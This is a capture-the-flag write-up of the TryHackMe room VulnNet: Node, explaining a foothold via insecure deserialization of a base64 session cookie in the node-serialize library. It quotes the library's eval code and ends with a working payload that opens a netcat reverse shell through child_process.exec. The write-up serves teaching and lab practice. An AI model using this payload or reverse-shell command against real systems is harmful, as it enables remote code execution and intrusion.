## VulnNet: Node
*After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?*

Easy rated. This is [VulnNet: Node](https://tryhackme.com/room/vulnnetnode) from THM. the *Node* refers to [node.js](https://nodejs.org/), and this box has a node deserialization foothold. This isn't a standard write-up; it's all about the foothold.

## Ports
Obviously we're looking for a web port, and the only open port is 8080, so that's what we want. Nmap tells us:

>PORT     STATE SERVICE REASON         VERSION  
8080/tcp open  http    syn-ack ttl 63 Node.js Express framework

## HTTP
On the page we visit it's a news type page, with a link to a login form. We don't need the login page, although if you figured that out immediately then you're sharper than I am. Cutting to the chase: the vulnerable point of this webapp is insecure deserialization of a cookie. Visiting the front page is enough to get the cookie set:

>Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D

This looks like (and is) base64. We can decode it:

>{"username":"Guest","isGuest":true,"encoding": "utf-8"}

So, how do we *know* this might be vulnerable to deserialization? It helps if we can prompt an error. Using Burp Suite repeater, we can GET a page that we know exists; it doesn't work with a 404 error. If we delete *part* of the cookie, we can get this error:

>SyntaxError: Unexpected token ï¿½ in JSON at position 56<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/server.js:16:24<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)

According to the error, this is a result of invalid JSON. Experimenting shows that deleting the **D** at the end of the cookie triggers the error, and so does deleting **3D**. However deleting **%3D** (equivalent to a single **=** in base64) does *not* trigger the error. Deleting some large arbitrary part (eg. half of it) will prompt the error.

Deleting the entire cookie or setting it to an empty string will *not* trigger the error. Changing the parameters in the cookie, e.g.

>{"username":"Timo","isGuest":false,"encoding": "utf-8"}

encoded:

>eyJ1c2VybmFtZSI6IlRpbW8iLCJpc0d1ZXN0IjpmYWxzZSwiZW5jb2RpbmciOiAidXRmLTgifQ==

will *not* prompt the error. Setting the cookie to some nonsense value will trigger the error:

>Cookie: session=asdasdasasd

## Error message
We can see from the error message, we're specifically using **node_modules/node-serialize/lib/serialize.js**. Skipping ahead, we can get information about what was used in this box:

{% highlight shell %}
$ cat package.json
{
  "_from": "node-serialize@0.0.4",
  "_id": "node-serialize@0.0.4",
  "_inBundle": false,
  "_integrity": "sha1-tzpJ4TUzBmVxA6Xkn38FJ5upf38=",
  "_location": "/node-serialize",
  "_phantomChildren": {},
  "_requested": {
    "type": "version",
    "registry": true,
    "raw": "node-serialize@0.0.4",
    "name": "node-serialize",
    "escapedName": "node-serialize",
    "rawSpec": "0.0.4",
    "saveSpec": null,
    "fetchSpec": "0.0.4"
  },
{% endhighlight %}

Digging into the package, we can see that the timestamp on the file (serialize.js) is from May 2014(!), so it's super old. It contains this code:

{% highlight shell %}
var circularTasks = [];
  var key;
  for(key in obj) {
    if(obj.hasOwnProperty(key)) {
      if(typeof obj[key] === 'object') {
        obj[key] = exports.unserialize(obj[key], originObj);
      } else if(typeof obj[key] === 'string') {
        if(obj[key].indexOf(FUNCFLAG) === 0) {
          obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
        } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
          obj[key] = obj[key].substring(CIRCULARFLAG.length);
          circularTasks.push({obj: obj, key: key});
        }
      }
    }
  }
{% endhighlight %}

The [github repo](https://github.com/luin/serialize) for the code actually calls out the issue:

>This module provides a way to unserialize strings into executable JavaScript code, so that it may lead security vulnerabilities if the original strings can be modified by untrusted third-parties (aka hackers). For instance, the following attack example provided by ajinabraham shows how to achieve arbitrary code injection with an IIFE:

{% highlight javascript %}
var serialize = require('node-serialize');
var x = '{"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}'
serialize.unserialize(x);
{% endhighlight %}

Interestingly, at the current [serialize javascript](https://www.npmjs.com/package/serialize-javascript) page at npm - github [here](https://github.com/yahoo/serialize-javascript) - it specifically says:

>Deserializing  
For some use cases you might also need to deserialize the string. This is explicitly not part of this module. However, you can easily write it yourself:

{% highlight javascript %}
function deserialize(serializedJavascript){
  return eval('(' + serializedJavascript + ')');
}
{% endhighlight %}

The vulnerability in the original version arises through the use of *eval*, which the new package doesn't include but tells you to DIY, because YOLO I guess lol.

## Vuln
The original writeup for the vulnerability seems to be [here](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). The exploit code is deserialized by the library, but in order to get it to execute, you need to use the [Immediately invoked function expression (IIFE)](https://en.wikipedia.org/wiki/Immediately_invoked_function_expression); essentially '()' after the function body.

There's a slightly more detailed write-up [here](https://blog.websecurify.com/2017/02/hacking-node-serialize.html); which expressly states:

>This means that if we create a JSON object with an arbitrary parameter which contains a value that begins with 

``
_$$ND_FUNC$$_ 
``

>we get remote code execution because it will eval.

This isn't explained anywhere, but it does appear repeatedly in writeups for this box and descriptions of the vulnerability. Where does it come from? From the source code of the [library](https://github.com/luin/serialize/blob/c82e7c3c7e802002ae794162508ee930f4506842/lib/serialize.js), actually:

{% highlight js %}
(function () {
  var FUNCFLAG = '_$$ND_FUNC$$_';
  var CIRCULARFLAG = '_$$ND_CC$$_';
  var KEYPATHSEPARATOR = '_$$.$$_';
  var ISNATIVEFUNC = /^function\s*[^(]*\(.*\)\s*\{\s*\[native code\]\s*\}$/;
// etc
{% endhighlight %}

So one example of code for a shell is this:

{% highlight js %}
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.123 1234 >/tmp/f')}()","isGuest":false,"encoding": "utf-8"}
{% endhighlight %}

No doubt there are others. So, an interesting foothold that could perhaps occur in real life scenarios. The error message is very helpful in narrowing down the focus, and knowing what works to prompt that message is half the battle.
